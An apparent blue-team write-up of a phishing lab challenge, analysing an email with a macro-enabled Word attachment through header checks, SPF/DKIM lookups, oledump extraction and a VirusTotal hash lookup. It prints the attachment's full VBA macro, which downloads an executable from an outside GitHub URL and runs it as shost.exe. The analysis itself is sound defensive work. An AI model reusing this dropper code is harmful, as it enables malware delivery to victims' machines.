---
{"dg-publish":true,"permalink":"/cards/blue-team/phishing/challenges/phishing-rerun-c3/"}
---

~ [[map-of-contents/blue-team\|blue-team]] 
### Initial Triage
---
The **from** says 'Adam' but the email content says 'Alexia' and lastly there is attached word document with a `.docm` extension, macro enabled.
![Phishing - Rerun C3.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3.png)
## Header Analysis
---
Date Sent: Tue, 14 May 2024 23:31:08 +0000

Subject: You're Invited!

Message-ID:
```C
<SA1PR14MB737384979FDD1178FD956584C1E32@SA1PR14MB7373.namprd14.prod.outlook.com>
```

Return-Path: `abarry@live.com`

Received: from SA1PR14MB7373.namprd14.prod.outlook.com

The `Message-ID` and `Received` header matches with outlook.com and the "namprd14.prod.outlook.com" domain matches with a `whois` lookup as outlook.com is owned by Microsoft:

Receiver: `emily.nguyen@glbllogistics.co`

Sender Display Name: Adam Barry

![Phishing - Rerun C3-1.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-1.png)
### Authentication Checks
---
Performing a `whois` lookup against the found domain on `return-path`:

![Phishing - Rerun C3-2.png|450](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-2.png)
It matches with the received headers as Azure and Outlook is both owned by Microsoft and the sender most likely used Azure's email services and the `return-path` matches with the `Received-SPF` record as well as passing the SPF check:

![Phishing - Rerun C3-3.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-3.png)
We can also confirm this with `dig`:

```C
dig TXT live.com | grep -i "spf"
```

Output shows that it aligns with Microsoft Outlook:

![Phishing - Rerun C3-4.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-4.png)
**Analyzing DKIM header:**

In order to verify and locate the public key, we need the domain highlighted by `d` and the selector highlighted by `s`:

![Phishing - Rerun C3-6.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-6.png)
Then using tools such as `nslookup` to perform DKIM lookup:
```C
nslookup -type=txt selector1._domainkey.live.com
```

Once again, it matches or aligns with Outlook.com: (ideally verify with DKIM lookup tool)
![Phishing - Rerun C3-5.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-5.png)
Then at the `Authentication-Results` shows, both authentication checks passed, no spoofing and content tampering found:

![Phishing - Rerun C3-7.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-7.png)
## Content Examination
---
There seems to be a sender and content email sender mismatch as highlighted:
![Phishing - Rerun C3-8.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-8.png)Viewing the source content, does not show any obsfucation techniques, just pure html:

![Phishing - Rerun C3-9.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-9.png)
### Content Examination
---
The email includes a `.docm` file which is macro enabled typically used by malicious actor to execute code once the document open:

Extracting the `.docm` file using `oledump.py` by first determining it's data stream number:

```C
python3 ../Tools/emldump.py challenge3.eml 
```

Output:
![Phishing - Rerun C3-10.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-10.png)
Then extracting the file in question with the command:

```C
python3 ../Tools/emldump.py challenge3.eml -s 5 -d > AR_Wedding_RSVP.docm
```

Then extracting it's file hash then upload it to VirusTotal to confirm if it's malicious or not:

```C
sha256sum AR_Wedding_RSVP.docm
```

Output: 

```
41c3dd4e9f794d53c212398891931760de469321e4c5d04be719d5485ed8f53e AR_Wedding_RSVP.docm 
```

VirusTotal flagged it as malicious and tagged it as trojan with a score of 44/66:

![Phishing - Rerun C3-12.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-12.png)
#### Static Analysis
---
**Extracting the script that is embedded in the document** by identifying first the data stream number:

```C
python3 ../Tools/oledump.py AR_Wedding_RSVP.docm 
```

Output:

![Phishing - Rerun C3-13.png](/img/user/cards/blue-team/phishing/images/Phishing%20-%20Rerun%20C3-13.png)
Then **revealing the source code:**
```C
python3 ../Tools/oledump.py AR_Wedding_RSVP.docm -s 3 --vbadecompresscorrupt
```

The most interesting part in this script is this:

```PowerShell
Set http_obj = CreateObject("Microsoft.XMLHTTP")
Set stream_obj = CreateObject("ADODB.Stream")
Set shell_obj = CreateObject("WScript.Shell")

URL = "https://github.com/TCWUS/Pastebin-Uploader.exe"
FileName = "shost.exe"
RUNCMD = "shost.exe"

http_obj.Open "GET", URL, False
http_obj.send

stream_obj.Type = 1
stream_obj.Open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FileName, 2

shell_obj.Run RUNCMD

```

Essentially what the script does is it downloads an executable from github (hxxps[://]github[.]com/TCWUS/Pastebin-Uploader[.]exe) and saves it **shost.exe** then gets executed by spawning a command prompt and calling it's filename.

**Verdict**: The `.docm` macro-enabled attachment alone is suspicious enough add in the fact that there is a slightly mispelled names between the `from` and found in the content but after further investigation by:

- Submitting the `.docm` hash in VirusTotal and getting flagged as malicious.
- The script embedded calls out to github and downloads an executable most likely is malicious.

With these evidence: the verdict is malicious.


53 mins.